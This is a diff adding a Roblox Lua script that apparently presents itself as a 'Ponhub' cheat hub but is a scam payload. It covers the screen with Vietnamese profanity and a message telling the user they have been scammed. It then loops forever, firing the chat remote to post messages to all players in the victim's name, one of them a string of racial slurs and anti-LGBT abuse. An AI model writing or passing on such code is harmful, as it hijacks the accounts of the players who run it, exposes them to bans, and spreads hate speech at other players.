@@ -1,0 +1,59 @@
+local cac = Instance.new('ScreenGui')
+cac.Parent = game.CoreGui
+
+local lon = Instance.new('TextLabel')
+lon.Parent = cac
+lon.BackgroundTransparency = 1
+lon.TextSize = 30
+lon.Text = 'anh em adonis voi minh beo dep trai nhat thien tha vu tru luon day may em dit me ma y'
+lon.TextColor3 = Color3.fromRGB(82, 47, 7)
+lon.Size = UDim2.new(1,0,1,0)
+repeat wait(1) until game:IsLoaded()
+
+
+wait(1.1)
+
+game.StarterGui:SetCore("SendNotification", {
+    Icon = "";
+    Title = "Ponhub", 
+    Text = "vo discord beo di em dit me may"
+})
+
+wait(2.4)
+
+game.StarterGui:SetCore("SendNotification", {
+    Icon = "";
+    Title = "pon hub", 
+    Text = "chao mung den su so than tien borderland :()"
+})
+
+local cac = Instance.new('ScreenGui')
+cac.Parent = game.CoreGui
+
+local lon = Instance.new('TextLabel')
+lon.Parent = cac
+lon.BackgroundTransparency = 1
+lon.TextSize = 30
+lon.Text = 'Me may oc lon va chuc mung da bi scam :))))'
+lon.TextColor3 = Color3.fromRGB(73, 49, 5)
+lon.Size = UDim2.new(1,0,1,0)
+repeat wait(1) until game:IsLoaded()
+
+
+
+local args2 = {
+    [1] = "game rac lam ah em dung choi nua :cringe:",
+    [2] = "All"
+}
+local args = {
+
+    [1] = "tao la nigga voi lgbt anh em di ra im nigga nigga nigga",
+
+    [2] = "All"
+}
+while wait() do
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait(.1)
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args2))
+wait(1)
+end
